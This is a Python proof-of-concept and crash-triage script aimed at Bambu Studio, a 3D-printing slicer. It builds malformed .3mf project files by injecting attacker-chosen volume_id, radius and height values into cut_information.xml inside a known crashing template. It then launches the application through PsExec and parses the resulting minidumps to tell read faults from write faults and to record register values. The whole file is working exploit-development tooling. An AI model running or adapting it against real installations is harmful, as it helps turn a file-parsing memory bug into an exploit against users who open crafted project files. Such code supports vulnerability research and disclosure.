import sys, os, zipfile, subprocess, time, glob, struct, mmap, shutil
TEMPLATE=r"C:\poc\evil.3mf"  # proven-crasher container; clone verbatim, swap only cut_information.xml
PSEXEC=r"C:\poc\PsExec64.exe"; BAMBU=r"C:\Program Files\Bambu Studio\bambu-studio.exe"
DUMPS=r"C:\dumps"; OUT=r"C:\poc\wl.3mf"
CUTNAME="Metadata/cut_information.xml"
def build(vid, radius="8391460.0", height="8391460.0", ctype="0"):
    cut=('<?xml version="1.0" encoding="utf-8"?>\n<objects>\n'
         ' <object id="1">\n  <cut_id id="0" check_sum="1" connectors_cnt="1"/>\n  <connectors>\n'
         f'   <connector volume_id="{vid}" type="{ctype}" radius="{radius}" height="{height}" r_tolerance="{radius}" h_tolerance="{height}"/>\n'
         '  </connectors>\n </object>\n'
         ' <object id="2"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n'
         ' <object id="3"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n'
         ' <object id="4"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n</objects>\n')
    if os.path.exists(OUT): os.remove(OUT)
    zin=zipfile.ZipFile(TEMPLATE,"r"); zout=zipfile.ZipFile(OUT,"w",zipfile.ZIP_DEFLATED)
    for item in zin.infolist():
        data=zin.read(item.filename)
        if item.filename==CUTNAME:
            data=cut.encode()
        zout.writestr(item, data)  # preserves ZipInfo incl. dir entries + order
    zin.close(); zout.close()
def parse(dmp):
    f=open(dmp,'rb'); d=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    ns=struct.unpack('<I',d[8:12])[0]; diro=struct.unpack('<I',d[12:16])[0]; S={}
    for i in range(ns):
        st,ds,rva=struct.unpack('<III',d[diro+i*12:diro+i*12+12]); S.setdefault(st,(ds,rva))
    ds,rva=S[6]; b=d[rva:rva+ds]
    ec=struct.unpack('<I',b[8:12])[0]; np=struct.unpack('<I',b[32:36])[0]
    ei=[struct.unpack('<Q',b[40+i*8:48+i*8])[0] for i in range(np)]
    csz,crva=struct.unpack('<II',b[160:168]); c=d[crva:crva+csz]
    def q(o): return struct.unpack('<Q',c[o:o+8])[0]
    rax,rcx,rip=q(0x78),q(0x80),q(0xf8)
    rw="W" if (np>=1 and ei[0]==1) else ("R" if np>=1 and ei[0]==0 else "?")
    fault=ei[1] if np>=2 else 0
    d.close(); f.close()
    return ec,rw,fault,rax,rcx,rip
def run(vid):
    build(vid)
    for x in glob.glob(DUMPS+r"\*.dmp"):
        try: os.remove(x)
        except: pass
    subprocess.run(["taskkill","/F","/IM","bambu-studio.exe"],capture_output=True)
    time.sleep(1)
    subprocess.run([PSEXEC,"-accepteula","-nobanner","-i","2","-u","poctest","-p","test1234","-d",BAMBU,OUT],
                   capture_output=True)
    dmp=None
    for _ in range(40):
        g=glob.glob(DUMPS+r"\*.dmp")
        if g:
            time.sleep(1.5)  # let WER finish writing
            dmp=g[0]; break
        time.sleep(1)
    if not dmp: return f"vid={vid:<12} NO-DUMP (no crash / clean import)"
    for _ in range(10):
        try:
            ec,rw,fault,rax,rcx,rip=parse(dmp); break
        except Exception as e:
            time.sleep(1)
    else:
        return f"vid={vid:<12} dump-unparsable"
    site="LOAD" if (rax+rcx*8)&0xffffffffffffffff==fault else "STORE/other"
    P=fault  # if STORE, fault≈P+off
    return f"vid={vid:<12} ex=0x{ec:x} {rw} fault=0x{fault:x} rax=0x{rax:x} rcx=0x{rcx:x} rip=0x{rip:x} [{site}]"
if __name__=="__main__":
    for a in sys.argv[1:]:
        print(run(int(a)), flush=True)
